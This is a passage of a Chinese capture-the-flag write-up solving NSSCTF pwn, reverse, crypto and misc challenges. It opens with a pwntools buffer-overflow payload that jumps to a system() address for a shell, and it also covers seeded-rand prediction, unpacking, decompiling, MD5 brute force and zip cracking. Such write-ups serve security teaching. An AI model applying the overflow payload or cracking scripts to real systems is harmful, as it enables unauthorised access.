system_addr = 0x0000000000401235

payload = b'a'*0xC + p64(0) + p64(system_addr)
sh.sendline(payload)

sh.interactive()
```

</br>

### Darling

拿到附件checksec

![截图](https://nssctf.wdf.ink/img/yxy/afdad17c8b94a7ad1139cc78464659f5.png)

64位，拖进IDA

![截图](https://nssctf.wdf.ink/img/yxy/fd5caa79bb81bcdef83d539af08388f5.png)

发现只要输入的数字满足预制的伪随机数，即可执行 `backdoor()` 函数

![截图](https://nssctf.wdf.ink/img/yxy/ab87abd0aee9da6ceca6827d7d1dca88.png)

进而拿到shell

考点：==伪随机数==

- `srand()` 函数：设定 `rand()` 函数的种子
- `rand()` 函数：通过固定的算法产生伪随机数，导致每次==种子相同时==生成的==随机数相同==

由此可得，这里的随机数是可以计算出来的

```c_cpp
#include <iostream>
using namespace std;
int main() {
    srand(0x1317E53u);
    cout << rand() % 100 - 64;
    return 0;
}
```

![截图](https://nssctf.wdf.ink/img/yxy/78253fbfb971ca168b0a5c2835564cde.png)

nc连上去，输入计算出来的数字 `17` ，拿到shell，在根目录发现flag，打开，解出

![截图](https://nssctf.wdf.ink/img/yxy/5a7c69eba07c1dbf6ffc5eeb2cb97044.png)

~~（Linux环境炸了不得不用windows，似乎编码有问题？~~

出题人真是浪漫啊

<br/>

## Reverse

### 贪吃蛇

拿到这道题，根据题目所述，拿到60分以上即可得到flag，有三种解决方案

- 玩出来
- IDA
- CE

当然，作为一个逆向小白首先尝试的是IDA，在静态分析没做出来时被迫选择了玩出来

不过做这个题首推的当然是CE

打开程序，恰一个，追踪分数地址，观察score由1开始变化，故先扫1

![截图](https://nssctf.wdf.ink/img/yxy/14de81e28c006ef2760debabd89f24e4.png)

恰一个，再扫2

![截图](https://nssctf.wdf.ink/img/yxy/e02cc2d218a554a10d35c45ed78141f1.png)

扫到一个，修改试试

![截图](https://nssctf.wdf.ink/img/yxy/d8c0e38361c94bb85f153a723ecc31a4.png)

嗯？再恰一个怎么又变到3了？

有鬼，接下来开始追踪一下这个地址

![截图](https://nssctf.wdf.ink/img/yxy/069758bc04f8e7adbeec977d46255fca.png)

追踪到两个，打开看看详细信息

![截图](https://nssctf.wdf.ink/img/yxy/1c12e534b4e4f88560be0b01862317bf.png)

第一个地址应该是改动被扫描的地址的，第二个地址则为真实分数的计算

-04？数字4恰好是蛇身的初始长度，通过计算蛇身的长度，再减去4，得到最终分数

所以我们要修改的不是score，而是蛇身长度

接下来开始重新扫描，先扫4

![截图](https://nssctf.wdf.ink/img/yxy/6ff2d83d5246588ca7ab8c0dee190555.png)

再恰一个，扫5，扫到一个地址，直接开始修改

![截图](https://nssctf.wdf.ink/img/yxy/0bcff23dfd28b23899c3e52dd7fa633a.png)

改个60以上的数字（Tips：不要改太大了，会发生溢出变成负数）

![截图](https://nssctf.wdf.ink/img/yxy/20d574c0ad7d136d1bbc304b4ecf8063.png)

撞墙，得到flag

![截图](https://nssctf.wdf.ink/img/yxy/e07d0d219c8cea9ec1342f4ecaba9ab5.png)

### babyre

简单到打开就能看见，此时需要我们用cmd来运行

![截图](https://nssctf.wdf.ink/img/yxy/573f434959eb950f7eee6ef6f3187a8a.png)

<br/>

### easyre

先打开，看不到什么，火速IDA一下

![截图](https://nssctf.wdf.ink/img/yxy/39c137d8840f0d1e5bf4073ebb0e4ec8.png)

空格，F5，查看伪代码，得到flag

![截图](https://nssctf.wdf.ink/img/yxy/7557cc3495b063e27b77a9032ec48a46.png)

<br/>

### xor

顾名思义，需要用到异或运算，直接扔IDA了

考点：==异或==

![截图](https://nssctf.wdf.ink/img/yxy/bc53abc895cfa756881dbd15f04a7659.png)

大致意思是，这一串 `LQQAVDyZMP]3q]emmf]uc{]vm]glap{rv]dnce` 被异或加密过，密码是2

随便找个在线工具，直接可以解出flag，推荐[atoolbox](http://www.atoolbox.net/)

![screen-capture](https://nssctf.wdf.ink/img/yxy/4053ecf87dc97ed01f7fa7ab2baff55e.png)

<br/>

### upx

考点：==upx脱壳== 

下载下来的附件似乎被压缩了

![截图](https://nssctf.wdf.ink/img/yxy/c7e9d061a78942cd62c3fdcf5a45a2d5.png)

结合题面，upx也是一种压缩手段，使用 exeinfope 进行查壳，UPX Shell脱壳

![截图](https://nssctf.wdf.ink/img/yxy/fd8e40b34e1c860102fe95a1b74b79e5.png)

UXP Shell脱壳后会覆盖原文件

![截图](https://nssctf.wdf.ink/img/yxy/4d7c77d87a758651e58e1e9153cfb5dc.png)

拖进IDA分析

![截图](https://nssctf.wdf.ink/img/yxy/23af6e0fd286e966febbefef790399f1.png)

异或加密，密钥为2，参照前文 **xor** ，解密可得

![截图](https://nssctf.wdf.ink/img/yxy/bb53760dce90ab5ad51d96f4fd490af9.png)

<br/>

### base64

考点：==base64编码==

顾名思义，直接用cyberchief暴力base64解码，不分析了

![截图](https://nssctf.wdf.ink/img/yxy/5072fc6dc7732b98b5ec5b22d11de71f.png)

<br/>

### base64-2

考点：==base64编码== ==自定义码表==

和 **base64** 类似，不过码表有所改动，不能暴力解决了，拖进IDA里分析一波

![截图](https://nssctf.wdf.ink/img/yxy/d925947a83d1c3e3e7166eb473300d6d.png)

在 ** sub_11C8** 函数下疑似找到主函数，在将用户的输入和 **s2** 进行比较，追踪 **s2**

![截图](https://nssctf.wdf.ink/img/yxy/f8740d02818be7d007b8ab63b7fb3ee2.png)

继续追踪

![截图](https://nssctf.wdf.ink/img/yxy/f0b7364872a5120655d35654c350ee04.png)

发现编码后的文字和码表，拖到cyberchif解密，出flag

![截图](https://nssctf.wdf.ink/img/yxy/b4441dd323f4e3287be8269f15a43eca.png)

<br/>

### android

签到题，安装就可以看到flag（KFC-CREAZY4-V-ME-50)

![截图](https://nssctf.wdf.ink/img/yxy/f05b59207efa38c5f99e6934f53587ca.png)

<br/>

![截图](https://nssctf.wdf.ink/img/yxy/093947b0fd41b47c1a2a1fce3a5deda3.png)

<br/>

### py1

两种思路：

- 唯唯诺诺，按照出题人的规定来完成这个小测试
- 重拳出击，直接把exe逆了

**唯唯诺诺**：

![截图](https://nssctf.wdf.ink/img/yxy/a056bbf9bcca484f7103451204fd9823.png)

考点：==异或== ==ASCii码==

- 异或：异或运算符在Python中为 `^` ，为可逆运算，A^B=C -> A^C=B，知二求全
  
  （当然你也可以用其他方法计算）
- `ord()` 函数：求字符的ascii码

~~最后记得回车一下（~~

**重拳出击**：

考点：==pyinstaller逆向==

根据题面和exe的图标来看，这个exe是由pyinstaller打包而成的，现在需要逆向解包

需要提前准备好python环境

使用工具 pyinstxtractor.py，将其放在与exe同一目录

![截图](https://nssctf.wdf.ink/img/yxy/a2b26145ef1b110392571ffda5d3e33e.png)

发现可能有用的文件

![截图](https://nssctf.wdf.ink/img/yxy/e90c3d856db74883432560c211861760.png)

使用记事本打开，直接找到flag

![截图](https://nssctf.wdf.ink/img/yxy/b7c5db5b6b26c1c6b64f5af47a9327ad.png)

<br/>

### py2

和 **py1** 思路类似，但是

![截图](https://nssctf.wdf.ink/img/yxy/67204e8beb1deaac4f6b4e695808e2f1.png)

出题人不让你唯唯诺诺了，直接要求重拳出击，参照 **py1**

![截图](https://nssctf.wdf.ink/img/yxy/4d75d08e548d46f15b5d1b4986c2a66b.png)

同样找到疑似有用的文件

![截图](https://nssctf.wdf.ink/img/yxy/06748baa066a22bf8436e7e917bb81d4.png)

打开，找到一串疑似flag的东西，似乎是base64，拿去解码

![截图](https://nssctf.wdf.ink/img/yxy/3f7b2774c41b290a2a58cec1ce1f4ffd.png)

wow，flag

![截图](https://nssctf.wdf.ink/img/yxy/a4ae5a0b6c970a2290612a78e1a04f71.png)

<br/>

### pypy

拿到一个pyc文件，怎么感觉和py是亲兄弟啊，不管是名称还是图标上

考点：==pyc逆向== ==异或== ==ascii码==

- 前提是配好python环境

使用 uncompyle6 逆向pyc，得到py

使用pip安装 uncompyle6 ：`pip install uncompyle6`

![截图](https://nssctf.wdf.ink/img/yxy/9558ae7f059d65831722f457aaaff614.png)

逆向pyc：`uncompyle6 -o .\re_pyc.py .\pyAndR.pyc` 得到 `re_pyc.py` 

是一个简单的py加密脚本，分析的时候注意==全局变量==，观察==变量和常量==

贴一个注释版的加密脚本：

```python
def init_S():
    global S
    for i in range(256):
        S.append(i)     # 得到一个从0-255的列表，S=[0,1,2,3,...,254,255]


def init_T():
    global Key
    global T
    Key = 'abcdefg' # Key为定值
    keylen = len(Key)
    for i in range(256):
        tmp = Key[(i % keylen)]
        T.append(tmp)   # 得到一个列表，为定值


def swap_S():
    j = 0
    for i in range(256):
        j = (j + S[i] + ord(T[i])) % 256
        tmp = S[i]
        S[i] = S[j]
        S[j] = tmp  #得到的 S 仍为定值


def Get_KeyStream():
    global KeyStream
    global text
    txtlen = len(text)
    j, t = (0, 0)
    for i in range(txtlen):
        i = i % 256
        j = (j + S[i]) % 256
        tmp = S[i]
        S[i] = S[j]
        S[j] = tmp
        t = (S[i] + S[j]) % 256
        KeyStream.append(S[t])  # 得到的KeyStream仅与输入长度相关


def Get_code():
    res = []
    for i in range(len(text)):
        res.append(ord(text[i]) ^ KeyStream[i]) #   获取每个字符的ascii码，再与KeyStorm的对应项作异或运算

    return res


if __name__ == '__main__':
    T, S, Key = [], [], []
    PlainText, CryptoText, KeyStream = '', '', []
    text = input('please input you flag:\n')    # 必须要输入点东西，不然就直接bad
    if not text:
        print('bad')
        exit()
    init_S()    #初始化S，得到一个定值列表
    init_T()    #初始化T，得到一个定值列表
    swap_S()    #对S再处理，得到一个定值列表
    Get_KeyStream()     #生成KeyStream，仅输入的长度与其相关
    res = Get_code()    #生成加密后的列表，与输入的长度和内容相关
    print(res)
    for i, ele in enumerate(res):
        if not ele == [84, 91, 254, 48, 129, 210, 135, 132, 112, 234, 208, 15, 213, 39, 108, 253, 86, 118, 248][i]:
            print('bad')
            exit()
    #   简而言之，上面的的就是让 res == [84, 91, 254, 48, 129, 210, 135, 132, 112, 234, 208, 15, 213, 39, 108, 253, 86, 118, 248]
    #   逆推回去，可以直接得到KeyStorm（长度已知）
    #   利用异或运算可逆的性质，反推出flag的ascii码，再chr一下得到flag
    print('good')
```

换言之，只需推出 `KeyStream` ，再把==每一项==和 `res` 的==对应项== 作异或运算，再`chr`一下

贴个exp：

```python
def init_S():
    S = []
    for i in range(256):
        S.append(i)     
    return S

def init_T():
    T = []
    Key = 'abcdefg' 
    keylen = len(Key)
    for i in range(256):
        tmp = Key[(i % keylen)]
        T.append(tmp)   
    return T

def swap_S():
    S = init_S()
    T = init_T()
    j = 0
    for i in range(256):
        j = (j + S[i] + ord(T[i])) % 256
        tmp = S[i]
        S[i] = S[j]
        S[j] = tmp 
    return S

def Get_KeyStream(res):
    KeyStream = []
    S = swap_S()
    txtlen = len(res)
    j, t = (0, 0)
    for i in range(txtlen):
        i = i % 256
        j = (j + S[i]) % 256
        tmp = S[i]
        S[i] = S[j]
        S[j] = tmp
        t = (S[i] + S[j]) % 256
        KeyStream.append(S[t])
    return KeyStream

if __name__ == "__main__":
    res = [84, 91, 254, 48, 129, 210, 135, 132, 112, 234, 208, 15, 213, 39, 108, 253, 86, 118, 248]
    flag = ''
    KeyStream = Get_KeyStream(res)
    for i in range(len(res)):
        s = chr(KeyStream[i] ^ res[i])
        flag+=s
    print(flag)
```

![截图](https://nssctf.wdf.ink/img/yxy/c629b9ee22ff5c38092f9a2fa99e91be.png)

得到flag

### android2

不是签到题的Android逆向

使用较轻量级的 jadx 来逆向apk，获得如下信息

得到密文：棿棢棢棲棥棷棊棐棁棚棨棨棵棢棌

![截图](https://nssctf.wdf.ink/img/yxy/f2e80ca9ae975c284c2a6c7baa95a3c3.png)

考点：==Android逆向== ==异或==

不知道此解算不算非预期，先审计一下代码

存在 `encoder` ，追踪进去看看

![截图](https://nssctf.wdf.ink/img/yxy/b0d0c6b2de8d50c26f16d2f380873a2a.png)

是一个简单的异或加密，key是123456789，先把密文转为ASCII码才能进行异或运算

前文 **xor** 已描述异或是知二求全的，故尝试解出明文

![截图](https://nssctf.wdf.ink/img/yxy/964d0b92c52f25190861d663a08acced.png)

看样子key完全不是123456789，根据代码分析不出key（太菜了）

那就来点技巧：flag的格式为NSSCTF{xxxxxxxxxxxxxxxxx}，那么开头一定是N咯

贴个exp

```python
a = "棿棢棢棲棥棷棊棐棁棚棨棨棵棢棌"
key = ord(a[0])^ord("N")
flag = ''

for x in a:
    flag += chr(ord(x)^key)
print(flag)
```

好怪，居然出来了

![screen-capture](https://nssctf.wdf.ink/img/yxy/5740da69f7b9ddedbb0f576e1e260e9e.png)

<br/>

### wasm

参考[ \[NSSRound#4 SWPU\]web](https://www.ctfer.vip/note/set/357) 的wp

~~（说实话是真没想到是原题，完全当成信息搜集题来做的~~

<br/>

## Crypto

### 善哉善哉

考点：==图片隐写== ==md5== ==新佛曰加密==

套娃达咩，先010看看~~（怎么感觉一股子misc味~~

![截图](https://nssctf.wdf.ink/img/yxy/3714f9e240dab91fcd979bc5c7c1f252.png)

在最后好像发现了什么东西，大概是摩尔斯电码，每一个字符由5个构成，不是数字就是中文

![截图](https://nssctf.wdf.ink/img/yxy/e8ff83c76cdc5e52f6a8f42f9d151550.png)

善哉善哉，新佛曰加密

![截图](https://nssctf.wdf.ink/img/yxy/488f1067a0e27ed34d3fb1ad61b4502d.png)

虽然但是，先前以为是我卡了，没想到解出来明文就是这句话

按照crypto的思想，大概是需要md5一下

![截图](https://nssctf.wdf.ink/img/yxy/2f11460689b0b4dbb0012b9305a13977.png)

得到flag：NSSCTF{7551772a99379ed0ae6015a470c1e335}

<br/>

### 什锦

开局一个task，解三段密码

考点：==社会主义核心价值观加密== ==猪圈密码== ==brain fuck==

CodeA：社会主义核心价值观加密

![截图](https://nssctf.wdf.ink/img/yxy/bb22e083492cdefdbdf2fa07d6a5e522.png)

CodeB：猪圈密码

![截图](https://nssctf.wdf.ink/img/yxy/52fbd5260d3fd74682b0009c6a707ccd.png)

暂且不知道大小写，解得pigissocutewhyyoukillpig

CodeC：BrainFuck（实际上为图灵完备的语言，不属于密码）

![截图](https://nssctf.wdf.ink/img/yxy/6f43e0193d952cd28cb082430a23ae31.png)

再md5一下，得到flag：NSSCTF{c05485d678cb8a6beb401f31d762532a}

![截图](https://nssctf.wdf.ink/img/yxy/e9ab86a29447277c5e229a73123c45a5.png)

<br/>

### All in Base

喜欢我WD的All in Base吗？你是懂base的。——zack

base全家桶，cyberchief伺候，可惜没有base16，得单独解码

考点：==base全家桶== 

- 最无脑辨别base的方法：词类统计，一共出现了多少种字符

64 -> 16 -> 32 -> 45 -> 58 -> 62 -> 64 -> 85 -> 85 -> 64 -> 62  -> 58 -> 45 -> 32 -> 16

![截图](https://nssctf.wdf.ink/img/yxy/921b03d290489c4d67b74da3199d8db6.png)

<br/>

### Welcome to Modern Cryptography

考点：==RSA==

- 分为Message、公钥、私钥
  
  一般情况下，公钥加密，私钥解密

![截图](https://nssctf.wdf.ink/img/yxy/9ee1b581cee06351d678b6acbb06479a.png)

<br/>

### Sign

考点：==keybase==

`BEGIN KEYBASE SALTPACK SIGNED MESSAGE` 开头的，keybase试试吧

![截图](https://nssctf.wdf.ink/img/yxy/8db6139542c0bdd80a0f635ea8d0f9fc.png)

记事本打开，得到flag

![截图](https://nssctf.wdf.ink/img/yxy/4edc279b08bcb1e12b807d81aae8c062.png)

<br/>

### Matrix

一个markdown，打开看看

![截图](https://nssctf.wdf.ink/img/yxy/7c203487efe9229aa0173de77906576d.png)

计算矩阵，使用numpy，贴个exp

```python
import numpy

E = numpy.array([[9,7,5,6,0,8,9,3,1,6,7,7,6,7,9,7,9,4,2,7],
[6,8,9,0,4,1,7,1,9,6,4,0,5,0,9,9,3,7,8,1],
[9,1,7,8,2,8,3,8,6,1,2,4,8,7,0,5,3,8,6,2],
[6,0,2,1,9,8,3,5,0,3,7,3,7,8,5,9,5,2,6,5],
[8,5,7,1,7,7,8,9,9,9,3,2,4,1,5,7,6,7,2,9],
[2,1,7,8,5,1,0,2,2,4,4,6,0,0,7,3,7,6,0,1],
[2,4,7,8,0,5,8,0,1,9,1,3,4,7,7,5,4,8,9,3],
[6,5,5,1,9,8,9,3,7,2,4,3,6,7,2,1,6,5,8,8],
[5,1,6,4,1,1,1,8,5,5,2,1,3,7,0,8,7,1,0,3],
[8,2,6,4,5,8,8,6,6,0,2,7,6,3,7,9,5,2,4,3],
[5,4,0,2,2,5,6,0,3,3,3,0,4,9,5,6,9,7,7,6],
[6,0,4,2,9,9,9,4,5,4,8,4,5,9,7,7,2,5,9,4],
[6,2,8,3,3,1,4,0,7,4,9,6,5,6,3,4,0,4,7,6],
[8,4,4,7,6,2,3,4,9,2,0,3,1,1,2,7,2,6,8,6],
[8,2,7,3,2,3,9,6,4,2,6,3,8,3,5,0,0,2,5,3],
[4,7,8,6,0,0,2,8,1,1,9,6,6,8,1,1,0,0,2,6],
[5,0,2,8,9,7,6,4,9,5,8,4,5,2,9,0,9,3,0,3],
[3,1,6,6,6,1,7,2,8,3,0,0,4,9,4,6,7,9,0,6],
[1,5,4,0,6,2,0,0,6,8,2,0,6,9,2,6,7,6,9,8],
[7,8,7,6,7,3,8,8,0,7,5,8,6,2,4,3,4,2,3,1]])
res = numpy.linalg.det(E)
print(int(res))
```

解得flag，NSSCTF{18458719258886139904}

<br/>

### AES

看着像base，又不仅仅是base，题面说是AES

考点：==AES== ==base==

![截图](https://nssctf.wdf.ink/img/yxy/bea7b44b31397e56afeb652dab4ddec8.png)

cyberchief伺候，先base64，再AES，出flag

![截图](https://nssctf.wdf.ink/img/yxy/fdd49513ee8bd4d417f4f2bc94138af3.png)

<br/>

### 爆破MD5

考点：==爆破MD5==

一个Crypto手需要会使用Python喔！

拿到了缺五个字符的data，根据要求编写脚本

```python
import hashlib
import string
dic = string.ascii_letters + string.digits + string.digits + string.punctuation
for i in dic:
  # 可不可以 i = "_" 先尝试下呢
    for j in dic:
        for k in dic:
            for h in dic:
                s = i + j + k + h
                data = f"Boom_MD5{s}"
                fin_md5 = hashlib.md5(data.encode('utf-8')).hexdigest()
                if '0618ac93d4631df725bceea74d0' in fin_md5:
                    print(data+'\n'+fin_md5)
```

（但凡仔细观察一点就可以发现规律，第一个字符是否应该从`_` 开始尝试呢？）

如果直接使用这个脚本的话，由于string的排序问题，至少要爆十几二十分钟

爆出flag：

![截图](https://nssctf.wdf.ink/img/yxy/9584cfc21df83b74902ee0511c979827.png)

<br/>

### Caesar?Ceaasr!

观察数据，有大括号，长得好像flag啊

考点：==凯撒密码== ==栅栏密码==

- 凯撒密码：对每个字符进行固定的偏移操作
- 栅栏密码：分栏，重排

凯撒密码穷举破解，发现个很NSSCTF的字符串

![截图](https://nssctf.wdf.ink/img/yxy/a2b3e0d4e9bbbd3ac107936456854ca7.png)

栅栏密码，每组字数为3

![截图](https://nssctf.wdf.ink/img/yxy/256a762d88e9fd0cce5327519ced10e9.png)

解出来flag不对？似乎是凯撒的问题

[凯撒密码在线解密](https://www.xiao84.com/tools/103175.html)        [栅栏密码在线解密](https://www.qqxiuzi.cn/bianma/zhalanmima.php)

![screen-capture](https://nssctf.wdf.ink/img/yxy/06e2792cf3f7f8aed89a4527fff97520.png)

![screen-capture](https://nssctf.wdf.ink/img/yxy/bf87e0f5b8a85cd49ba71664ca92ff65.png)

<br/>

### Not Victoria

不是维多利亚？既然是crypto，那就是维吉尼亚吧

可以采用此 [爆破网站](https://www.guballa.de/vigenere-solver)

![截图](https://nssctf.wdf.ink/img/yxy/02002f51031fe693bf2a0f1f95d6e9f4.png)

爆破出通顺的英文句子，附了一串base，解码base32可得flag

![截图](https://nssctf.wdf.ink/img/yxy/76531c1f587859009cd866ad8b416240.png)

<br/>

### Huge Sudoku

解数独，按照UUID格式排好，出flag

推荐 [数独自动求解器 - 文字输入格式 - 16x16](https://www.sentohsharyoga.com/zh/puzzle/sudoku/text/size4x4)

稍微手搓（抄）了个脚本格式化了一下，稍微好看了一点

![截图](https://nssctf.wdf.ink/img/yxy/cac2d07448404d48ad2d09521848e536.png)

得到flag

*抄不来代码可以不用抄，省的某个大怨种跑了大半个月没跑出来*

<br/>

## Misc

### Crack Me

拿到一个压缩包，当然是解压啦

![截图](https://nssctf.wdf.ink/img/yxy/767bfe56bf5a468033ec836d2b3aafa7.png)

有密码，三种思路：

- 伪加密：010查看压缩包相关数据
- 直接爆破：ARCHPR
- CRC爆破：位数较少，已知CRC

拖进010

![截图](https://nssctf.wdf.ink/img/yxy/6e6788e23fa5a135a8c1889ae9aef92f.png)

此处若为奇数，则加密，反之则未加密，先修改为偶数，尝试解压

![截图](https://nssctf.wdf.ink/img/yxy/ef8ea5beb1681aff0d32a76a28f0a56b.png)

解压成功，得到两个一模一样的压缩包，直接爆破

- tips：优先从数字开爆

![截图](https://nssctf.wdf.ink/img/yxy/875648089ced2b6d423bce53e0804a97.png)

找到密码，解压，打开flag.txt

![截图](https://nssctf.wdf.ink/img/yxy/974d1f6ba4ad128dcb6d3b2d9b860211.png)

这么多flag拿到手软（x

<br/>

### Cycle Again

Two different types also similar，确实挺similar的

![截图](https://nssctf.wdf.ink/img/yxy/df1467ab6fd99e22b539cf88ae8269ea.png)

一张损坏的last，拿到png先查宽高

考点：==图片宽高== ==CRC循环校验==

- CRC可用于校验图片宽高，也可用于校验压缩包文件，借此来破解某些特殊的压缩包

贴个CRC校验宽高的脚本，本质上也是穷举

```python
import zlib
import struct
import itertools

path = input('png文件绝对路径')

bin_data = open(path, 'rb').read()
crc32key = zlib.crc32(bin_data[12:29]) # 计算crc
original_crc32 = int(bin_data[29:33].hex(), 16) # 原始crc


if crc32key == original_crc32: # 计算crc对比原始crc
    print('宽高没有问题!')
else:
    input_ = input("宽高被改了, 是否CRC爆破宽高? (Y/n):")
    if input_ not in ["Y", "y", ""]:
        exit()
    else: 
        for i, j in itertools.product(range(4095), range(4095)): # 理论上0x FF FF FF FF，但考虑到屏幕实际/cpu，0x 0F FF就差不多了，也就是4095宽度和高度
            data = bin_data[12:16] + struct.pack('>i', i) + struct.pack('>i', j) + bin_data[24:29]
            crc32 = zlib.crc32(data)
            if(crc32 == original_crc32): # 计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定
                print(f"\nCRC32: {hex(original_crc32)}")
                print(f"宽度: {i}, hex: {hex(i)}")
                print(f"高度: {j}, hex: {hex(j)}")
                exit(0)
```

![截图](https://nssctf.wdf.ink/img/yxy/532473d99d6631933603144aec23dbad.png)

![截图](https://nssctf.wdf.ink/img/yxy/7eb7bc552c0f40010bc01a171fbebc94.png)

修改后可以正常显示，打开放大，找到第一段flag

![截图](https://nssctf.wdf.ink/img/yxy/e51cbbb9a1ecff529d267e7c6d26961f.png)

第二段flag在压缩包中，打开压缩包，发现加密

![截图](https://nssctf.wdf.ink/img/yxy/2af56fb162fb2154ef3d3add9243601c.png)

原始大小4，初步断定4个字符，7段，和前面的凑起来刚好组成UUID格式的flag

对于这种形式的压缩包，结合题目提示，采用 ==CRC32== 来爆破内容，而不是密码

贴（抄）个脚本：

```python
#!/usr/bin/env python 
# -*- coding:utf-8 -*-
# python3
import zipfile
import string
import binascii


def CrackCrc(f, crc):  # 通过枚举的方法暴力验证CRC，前提是已知长度
    for i in dic:
        for j in dic:
            for k in dic:
                for h in dic:
                    s = i + j + k + h   # 长度为4的字符
                    if crc == (binascii.crc32(s.encode())):
                        f.write(s)  # 记录爆破内容
                        return


def CrackZip():
    f = open("./result.txt", "w")
    for i in range(2,9):    # 生成2-8这几个数字，对应part文件名
        file = "./Moment.zip"
        crc = zipfile.ZipFile(file, 'r').getinfo(f'part{i}.txt').CRC
        CrackCrc(f,crc)
        print('\r' + "loading：{:%}".format(float((i - 1) / 7)), end='')
    f.close()
    with open("./result.txt", "r+", encoding='utf-8') as fr:
        res = fr.read()
    return res

if __name__ == "__main__":
    dic = string.ascii_letters + string.digits + '-{' + '}' # 字典，大小写+数字+短横线+大括号（UUID格式的flag）
    print("\nCRC32begin")
    res = CrackZip()
    print("\nCRC32finished\n")
    print(res)
```

可能需要爆个一分钟左右

![截图](https://nssctf.wdf.ink/img/yxy/197cc604bce64fc5a84beb2a74f72455.png)

拼凑得到完整的flag：NSSCTF{41d769db-9f5d-455e-a458-8012ba3660f3}

<br/>

### Coffee Please

经典的office隐写，这次是一家三口整整齐齐，可能是三段

考点：==office隐写==

- word, excel, ppt均可以压缩包的方式打开，可先解压，再重压缩，再通过office打开
- 你甚至可以在解压后的所有文件里直接找flag
- 随时全选，放大，调色，有意外收获

word：

![截图](https://nssctf.wdf.ink/img/yxy/d9c329a5ad7ddcd1b1817c2dc5e1a51d.png)

excel：

![截图](https://nssctf.wdf.ink/img/yxy/390ad0444a6b87427823c97a14529b69.png)

ppt：

![截图](https://nssctf.wdf.ink/img/yxy/76ba1765edeefce985729511536e494e.png)

![截图](https://nssctf.wdf.ink/img/yxy/7acc2fefa65d1769b6517b3e5276349f.png)

拼接可得：NSSCTF{8ff8a53a-9378-4e78-b54a-ef86e8c84432}

<br/>

### Convert Something

Two ways to hide in text，文本隐写

考点：==零宽字符== ==base隐写==

- 零宽字符：真实存在，但是肉眼不可见的字符
  
  零宽度空格符 (zero-width space) U+200B

零宽度非断空格符 (zero width no-break space) U+FEFF 
零宽度连字符 (zero-width joiner) U+200D 
零宽度断字符 (zero-width non-joiner) U+200C :
左至右符 (left-to-right mark) U+200E : 
右至左符 (right-to-left mark) U+200F : 

- base隐写：不同于base编码，显著特征是==一行几个字符，等号时有时无==

一眼base隐写，贴（抄）个脚本：

```python
import base64

def Base64Stego_Decrypt(LineList):
    Base64Char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"     #Base64字符集 已按照规范排列
    BinaryText = ""
    for line in LineList:
        if line.find("==") > 0:     #如果文本中有2个=符号
            temp = bin(Base64Char.find(line[-3]) & 15)[2:]      #通过按位与&15运算取出二进制数后4位 [2:]的作用是将0b过滤掉
            BinaryText = BinaryText+"0"*(4-len(temp))+temp      #高位补0
        elif line.find("=") > 0:        #如果文本中有1个=符号
            temp = bin(Base64Char.find(line[-2]) & 3)[2:]       #通过按位与&3运算取出二进制数后2位
            BinaryText = BinaryText+"0"*(2-len(temp))+temp      #高位补0
    Text = ""
    if(len(BinaryText) % 8 != 0):       #最终得到的隐写数据二进制位数不一定都是8的倍数，为了避免数组越界，加上一个判断
        print("警告:二进制文本位数有误，将进行不完整解析。")
        for i in range(0, len(BinaryText), 8):
            if(i+8 > len(BinaryText)):
                Text = Text+"-"+BinaryText[i:]
                return Text
            else:
                Text = Text+chr(int(BinaryText[i:i+8], 2))
    else:
        for i in range(0, len(BinaryText), 8):
            Text = Text+chr(int(BinaryText[i:i+8], 2))      #将得到的二进制数每8位一组对照ASCII码转化字符
        return Text

def Base64_ForString_Decrypt(Text):     #Base64解密
    try:
        DecryptedText = str(Text).encode("utf-8")
        DecryptedText = base64.b64decode(DecryptedText)
        DecryptedText = DecryptedText.decode("utf-8")
    except:
        return 0
    return DecryptedText

if __name__ == "__main__":
    Course = input("base64文件绝对路径")
    File = open(Course, "r")
    LineList = File.read().splitlines()
    print("显式内容为:")
    for line in LineList:
        print(Base64_ForString_Decrypt(line),end="")
    print("隐写内容为:")
    print(Base64Stego_Decrypt(LineList))
```

发现执行报错，猜测还有其他隐写

![截图](https://nssctf.wdf.ink/img/yxy/cead675160441cdf9fba741b692e6fa1.png)

扔010，文本一般都不是什么好东西

![截图](https://nssctf.wdf.ink/img/yxy/966ac67d28fdde5ff0539d46db71434f.png)

在倒数几行发现异常，由于记事本内不可见，故尝试零宽字符隐写，[在线解密](https://yuanfux.github.io/zero-width-web/)

好像复制不出来（？）扔vscode试试：

![截图](https://nssctf.wdf.ink/img/yxy/a3d1a8666ff1b4939ef698006a8dd517.png)

复制，解密，得到后半段flag

![截图](https://nssctf.wdf.ink/img/yxy/df39065f1d09db29477378a4b36667ed.png)

删除零宽字符隐写，利用脚本解密base隐写，得到前半段flag

![截图](https://nssctf.wdf.ink/img/yxy/e47f2c281769ee8b07d28c49cb3e5a04.png)

拼凑得到完整flag：NSSCTF{e16bc777-0d4a-4b74-92b4-404bc0320da4}

<br/>

### Coding In Time

拿到gif，拆个帧先，推荐[在线网站](https://uutool.cn/gif2img/)

![截图](https://nssctf.wdf.ink/img/yxy/fbfb24c818020e86efa071dd5fda382f.png)

是一个二维码，把所有帧下载下来后利用PPT（？）拼接

![截图](https://nssctf.wdf.ink/img/yxy/9cc857ca60ed93748d8dd5653d65888f.png)

得到二维码，扫描得到前半段flag，[在线网站](https://cli.im/deqr)

![截图](https://nssctf.wdf.ink/img/yxy/bfeb26b87104a01bd362ae3a2dade86c.png)

Tick tock, tick tock, you found it，结合题目，似乎和时间有关？

扔010，看到最后一行貌似有工具？

![截图](https://nssctf.wdf.ink/img/yxy/00f715506e4ad85b119ac384d902f684.png)

下载下来这个工具，打开gif

![截图](https://nssctf.wdf.ink/img/yxy/fde9d95c49c5f8bdf28f9b46c9444a45.png)

这个时间排布怎么看上去有点无序，或者暗藏玄机？

以UUID的格式，flag还差9位，其中最后一位肯定是大括号，二维码刚好被拆成九个部分

取“}”的ASCII码，发现刚好等于125，由此得到flag

![截图](https://nssctf.wdf.ink/img/yxy/927c98e6e2ebab1545bec89feab353b5.png)

NSSCTF{114f75b5-ef1c-4ece-b062-8852cfbdde7f}

<br/>

### Cover Removed

~~勇敢叔叔，不怕上单~~

考点：==PDF隐写==

- 类比office隐写，全选，调色，放大……
- 把信息藏在pdf文件本体中

下载下来是一个PDF，打开，类比前文 **Coffee Please** ，暂时无法编辑，全选看看

![截图](https://nssctf.wdf.ink/img/yxy/14f8869a928c6745360a2557a07a8c02.png)

发现异常，复制下来得到前半段flag：NSSCTF{c024c35f-7358

